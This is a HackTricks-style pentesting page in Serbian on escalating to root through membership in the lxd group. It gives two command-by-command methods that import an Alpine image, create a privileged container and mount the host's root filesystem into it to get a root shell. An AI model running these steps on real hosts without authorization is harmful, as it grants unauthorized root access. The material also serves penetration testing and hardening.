# lxd/lxc Group - Privilege escalation

{{#include ../../../banners/hacktricks-training.md}}

Članstvo u LXD management grupi hosta (obično _**lxd**_) može obezbediti put do root-a omogućavanjem potpune kontrole nad daemon-om.<sup>[[1]](#references)</sup>

## Exploiting without internet

### Method 1

Možete preuzeti Alpine image koji ćete koristiti sa LXD-om iz pouzdanog repozitorijuma.  
Canonical-ov LXD image server objavljuje dnevne build-ove: [https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)  
Samo preuzmite **lxd.tar.xz** i **rootfs.squashfs** iz najnovijeg build-a (ime direktorijuma predstavlja datum).<sup>[[8]](#references)</sup>

Alternativno, možete instalirati distrobuilder na svojoj mašini prateći [uputstva projekta](https://github.com/lxc/distrobuilder).<sup>[[4]](#references)[[5]](#references)[[6]](#references)</sup>
```bash
# Install requirements
sudo apt update
sudo apt install -y golang-go gcc debootstrap rsync gpg squashfs-tools git make build-essential libwin-hivex-perl wimtools genisoimage

# Clone repo
mkdir -p $HOME/go/src/github.com/lxc/
cd $HOME/go/src/github.com/lxc/
git clone https://github.com/lxc/distrobuilder

# Make distrobuilder
cd ./distrobuilder
make

# Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml

# Create the container - Beware of architecture while compiling locally.
sudo $HOME/go/bin/distrobuilder build-incus alpine.yaml -o image.release=3.18 -o image.architecture=x86_64
```
Otpremite **incus.tar.xz** (**lxd.tar.xz** ako ste ga preuzeli sa Canonical image servera) i **rootfs.squashfs**, zatim uvezite image i kreirajte container.<sup>[[2]](#references)[[3]](#references)[[5]](#references)[[8]](#references)[[9]](#references)</sup>
```bash
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine

# Check the image is there
lxc image list

# Create the container
lxc init alpine privesc -c security.privileged=true

# List containers
lxc list

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```
> [!CAUTION]
> Ako naiđete na ovu grešku _**Error: No storage pool found. Please create a new storage pool**_\
> Pokrenite **`lxd init`**, podesite podrazumevani storage pool, a zatim **ponovite prethodni blok naredbi**.<sup>[[2]](#references)</sup>

Na kraju, pokrenite container i otvorite root shell na filesystemu hosta:<sup>[[1]](#references)[[2]](#references)</sup>
```bash
lxc start privesc
lxc exec privesc /bin/sh
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
```
### Metod 2

Izgradite Alpine image i pokrenite ga sa zastavicom `security.privileged=true`, koja mapira root kontejnera na root hosta; montiranje `/` zatim izlaže filesystem hosta unutar kontejnera.<sup>[[1]](#references)[[7]](#references)[[9]](#references)</sup>
```bash
# build a simple alpine image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
sudo ./build-alpine -a i686

# import the image
lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.

# before running the image, start and configure the lxd storage pool as default
lxd init

# run the image
lxc init myimage mycontainer -c security.privileged=true

# mount the /root into the image
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
```
## References

- [1] [Kako ojačati bezbednost za LXD](https://canonical.com/lxd/docs/latest/howto/security_harden/)
- [2] [LXD containers and virtual machines](https://ubuntu.com/server/docs/how-to/virtualisation/lxd/)
- [3] [Kako kopirati i uvesti images](https://canonical.com/lxd/docs/latest/howto/images_copy/)
- [4] [distrobuilder](https://github.com/lxc/distrobuilder)
- [5] [Kako izgraditi images pomoću distrobuilder-a](https://github.com/lxc/distrobuilder/blob/main/doc/howto/build.md)
- [6] [Alpine image definition](https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml)
- [7] [lxd-alpine-builder build script](https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine)
- [8] [LXD image server](https://images.lxd.canonical.com/)
- [9] [Tip: disk](https://canonical.com/lxd/docs/latest/reference/devices_disk/)
{{#include ../../../banners/hacktricks-training.md}}
